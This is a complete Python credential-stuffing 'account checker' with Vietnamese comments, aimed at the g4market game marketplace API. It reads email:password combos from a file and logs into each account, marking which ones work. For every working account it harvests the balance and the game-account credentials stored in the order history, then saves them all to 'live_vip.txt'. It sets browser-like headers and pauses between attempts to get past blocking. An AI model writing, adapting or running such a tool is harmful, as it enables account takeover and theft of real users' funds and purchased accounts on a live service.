import requests
import time

# --- CẤU HÌNH API ---
URL_LOGIN = "https://g4market.io.vn/api/users/login"
URL_USERS = "https://g4market.io.vn/api/users"
URL_ORDERS = "https://g4market.io.vn/api/order-history?page=1&type=ALL&perpage=10"

BASE_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://g4market.com",
    "Referer": "https://g4market.com/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

def check_account(email, password):
    session = requests.Session()
    print(f"\n[{email}] Đang kiểm tra...")

    payload = {"identifier": email, "password": password}
    
    # Biến lưu trữ kết quả để trả về
    result_data = {
        "is_live": False,
        "balance": "0 VNĐ",
        "games": "Không có game"
    }

    try:
        res_login = session.post(URL_LOGIN, json=payload, headers=BASE_HEADERS)
        
        if res_login.status_code not in [200, 201]:
            if res_login.status_code == 401:
                print("  ❌ Sai tài khoản hoặc mật khẩu!")
            elif res_login.status_code == 403:
                print("  ⛔ Bị Cloudflare chặn (Lỗi 403)!")
            else:
                print(f"  ❌ Lỗi mã {res_login.status_code}")
            return result_data # Trả về False
            
        data_login = res_login.json()
        access_token = data_login.get("access_token")
        
        if not access_token:
            print("  ❌ Không lấy được Token!")
            return result_data

        print("  ✅ Đăng nhập OK! Đang trích xuất dữ liệu...")
        result_data["is_live"] = True # Đánh dấu acc sống

        auth_headers = BASE_HEADERS.copy()
        auth_headers["Authorization"] = f"Bearer {access_token}"

        # LẤY SỐ DƯ
        res_users = session.get(URL_USERS, headers=auth_headers)
        if res_users.status_code == 200:
            user_data = res_users.json()
            balance = user_data.get("balance", 0)
            result_data["balance"] = f"{balance:,} VNĐ"
            print(f"  💰 Số dư: {result_data['balance']}")

        # LẤY ĐƠN HÀNG & TÀI KHOẢN GAME
        res_orders = session.get(URL_ORDERS, headers=auth_headers)
        if res_orders.status_code == 200:
            orders_data = res_orders.json()
            order_list = []
            
            if isinstance(orders_data, dict) and "data" in orders_data:
                order_list = orders_data["data"]
            elif isinstance(orders_data, list):
                order_list = orders_data

            if order_list:
                game_details = []
                print(f"  🎮 Tìm thấy {len(order_list)} game.")
                for order in order_list:
                    product_obj = order.get("product", {})
                    game_name = product_obj.get("title", product_obj.get("name", "Không rõ tên"))
                    acc_info = order.get("account_info", "")
                    
                    if acc_info:
                        game_details.append(f"{game_name} ({acc_info})")
                    else:
                        game_details.append(game_name)
                
                # Nối danh sách game lại thành 1 dòng chữ, cách nhau bằng dấu phẩy
                result_data["games"] = ", ".join(game_details)
            else:
                print("  🎮 Không có đơn hàng.")
                
        return result_data

    except Exception as e:
        print(f"  ❌ Lỗi mạng: {e}")
        return result_data

# ==========================================
# PHẦN CHẠY TOOL & XUẤT FILE CHUYÊN NGHIỆP
# ==========================================
print("====================================")
print(" TOOL VIP CHECK & XUẤT DATA G4MARKET")
print("====================================")

try:
    with open("taikhoan.txt", "r", encoding="utf-8") as f:
        lines = f.readlines()
        
    for line in lines:
        line = line.strip()
        if not line: continue
            
        try:
            email, password = line.split(":", 1)
            
            # Nhận toàn bộ data trả về từ hàm
            acc_data = check_account(email, password)
            
            # Ghi file
            if acc_data["is_live"]:
                # Chuẩn bị định dạng chuỗi thật đẹp để ghi ra file
                # Cấu trúc: email:pass | Số dư: xxx | Game: Tên game (user:pass), Tên game 2
                chuoi_xuat_file = f"{email}:{password} | Số dư: {acc_data['balance']} | Game: {acc_data['games']}\n"
                
                with open("live_vip.txt", "a", encoding="utf-8") as f_live:
                    f_live.write(chuoi_xuat_file)
            else:
                with open("die.txt", "a", encoding="utf-8") as f_die:
                    f_die.write(f"{email}:{password}\n")
                    
            time.sleep(1.5)
            
        except ValueError:
            print(f"\n❌ Bỏ qua dòng sai định dạng: {line}")
            
    print("\n🎉 HOÀN TẤT! Toàn bộ tài sản đã được lưu vào file 'live_vip.txt'.")
except FileNotFoundError:
    print("❌ LỖI: Không tìm thấy file 'taikhoan.txt'!")